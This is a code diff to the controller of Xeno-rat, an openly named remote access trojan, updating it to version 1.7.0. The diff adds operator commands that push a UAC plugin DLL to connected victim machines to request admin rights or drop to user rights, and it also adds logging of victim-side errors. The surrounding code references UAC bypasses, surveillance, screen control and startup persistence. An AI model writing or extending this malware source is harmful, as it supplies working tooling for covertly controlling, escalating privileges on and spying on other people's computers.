@@ -26,6 +26,7 @@ using System.Reflection.Emit;
 using Newtonsoft.Json.Linq;
 using xeno_rat_server.Forms;
 using System.IO.Compression;
+using System.Net;
 
 namespace xeno_rat_server
 {
@@ -43,12 +44,14 @@ namespace xeno_rat_server
         private System.Windows.Forms.Timer ConfigUpdateTimer;
         private string LastConfig = "";
 
+        private static bool LogErrors = true;
+
 
         public MainForm()
         {
             
             InitializeComponent();
-            this.Text = "Xeno-rat: Created by moom825 - version 1.6.0";
+            this.Text = "Xeno-rat: Created by moom825 - version 1.7.0";
             key = Utils.CalculateSha256Bytes(string_key);
 
             ListeningHandler =new Listener(OnConnect);
@@ -92,11 +95,15 @@ namespace xeno_rat_server
             Uac_Bypass[1] = "Windir + Disk Cleanup";
             Uac_Bypass[2] = "Fodhelper";
 
+            string[] Uac_Options = new string[2];
+            Uac_Options[0] = "Request admin";
+            Uac_Options[1] = "De-escalate to user";
 
             Commands["Fun"] = Fun;
             Commands["Surveillance"] = Surveillance;
             Commands["System"] = System;
             Commands["Uac Bypass"] = Uac_Bypass;
+            Commands["Uac Options"] = Uac_Options;
             Commands["Client"] = Client;
             Commands["Power"] = Power;
         }
@@ -135,6 +142,7 @@ namespace xeno_rat_server
                     client.Disconnect();
                     return;
                 }
+                
                 //currentCount++;
                 Node HeartSock=await client.CreateSubNodeAsync(1);//create HeartBeat Node
                 if (HeartSock == null) 
@@ -418,7 +426,19 @@ namespace xeno_rat_server
                     break;
                 }
                 int op = data[0];
-                if (op != 1)
+                if (op == 3)
+                {
+                    
+                    try {
+                        string error_msg=Encoding.UTF8.GetString(data, 1, data.Length - 1);
+                        if (LogErrors) 
+                        {
+                            AddLog("Application error has occurred: " + error_msg, Color.Red);
+                        }
+                    } catch { }
+                    break;
+                }
+                else if (op != 1)
                 {
                     break;
                 }
@@ -464,6 +484,7 @@ namespace xeno_rat_server
             controlData["checkBox1"] = checkBox1.Checked;
             controlData["checkBox2"] = checkBox2.Checked;
             controlData["checkBox3"] = checkBox3.Checked;
+            controlData["checkBox4"] = checkBox4.Checked;
             controlData["OnConnectTasks"] = OnConnectTasks;
             controlData["string_key"] = string_key;
             List<int> ports = new List<int>();
@@ -506,6 +527,7 @@ namespace xeno_rat_server
                 checkBox1.Checked = Convert.ToBoolean(controlData["checkBox1"]);
                 checkBox2.Checked = Convert.ToBoolean(controlData["checkBox2"]);
                 checkBox3.Checked = Convert.ToBoolean(controlData["checkBox3"]);
+                checkBox4.Checked = Convert.ToBoolean(controlData["checkBox4"]);
                 OnConnectTasks = ((JArray)controlData["OnConnectTasks"]).ToObject<List<string>>();
                 foreach (string i in OnConnectTasks)
                 {
@@ -922,6 +944,60 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Uacbypass!" + e.Message);
             }
         }
+        private async Task StartRequestForAdmin(Node client)
+        {
+            try
+            {
+                Node subClient = await client.CreateSubNodeAsync(2);
+                bool worked = await Utils.LoadDllAsync(subClient, "Uacbypass", File.ReadAllBytes("plugins\\Uacbypass.dll"), AddLog);
+                if (!worked)
+                {
+                    MessageBox.Show("Error Starting Uacbypass dll!");
+                    return;
+                }
+                await subClient.SendAsync(new byte[] { 4 });
+                subClient.SetRecvTimeout(20000);
+                byte[] data = await subClient.ReceiveAsync();
+                if (data == null || data[0] != 1)
+                {
+                    MessageBox.Show("The user most likely clicked no on the uac prompt (or it timed out)");
+                    return;
+                }
+                subClient.Disconnect();
+                MessageBox.Show("The user clicked yes! You should have admin.");
+            }
+            catch (Exception e)
+            {
+                MessageBox.Show("Error with Uacbypass dll!" + e.Message);
+            }
+        }
+        private async Task StartDeescalateperms(Node client)
+        {
+            try
+            {
+                Node subClient = await client.CreateSubNodeAsync(2);
+                bool worked = await Utils.LoadDllAsync(subClient, "Uacbypass", File.ReadAllBytes("plugins\\Uacbypass.dll"), AddLog);
+                if (!worked)
+                {
+                    MessageBox.Show("Error Starting Uacbypass dll!");
+                    return;
+                }
+                await subClient.SendAsync(new byte[] { 5 });
+                subClient.SetRecvTimeout(20000);
+                byte[] data = await subClient.ReceiveAsync();
+                if (data == null || data[0] != 1)
+                {
+                    MessageBox.Show("Failed to Start a new process with user perms.");
+                    return;
+                }
+                subClient.Disconnect();
+                MessageBox.Show("Started a new process with user perms.");
+            }
+            catch (Exception e)
+            {
+                MessageBox.Show("Error with Uacbypass dll!" + e.Message);
+            }
+        }
         private async Task StartScreenControl(Node client)
         {
             try
@@ -1211,6 +1287,14 @@ namespace xeno_rat_server
             {
                 StartPlugin(StartFodHelperBypass, client);
             }
+            else if (command == "Request admin") 
+            {
+                StartPlugin(StartRequestForAdmin, client);
+            }
+            else if (command == "De-escalate to user") 
+            {
+                StartPlugin(StartDeescalateperms, client);
+            }
             else if (command == "Screen Control")
             {
                 StartPlugin(StartScreenControl, client);
@@ -1235,7 +1319,7 @@ namespace xeno_rat_server
             {
                 StartPlugin(StartStartup, client);
             }
-            else if (command == "Remove Startup") 
+            else if (command == "Remove Startup")
             {
                 StartPlugin(StartRemoveStartup, client);
             }
@@ -1607,6 +1691,11 @@ namespace xeno_rat_server
 
                 contextMenu.Show(listView3, e.Location);
             }
+        }
+
+        private void checkBox4_CheckedChanged(object sender, EventArgs e)
+        {
+            LogErrors = checkBox4.Checked;
         }
     }
     public static class IconInjector
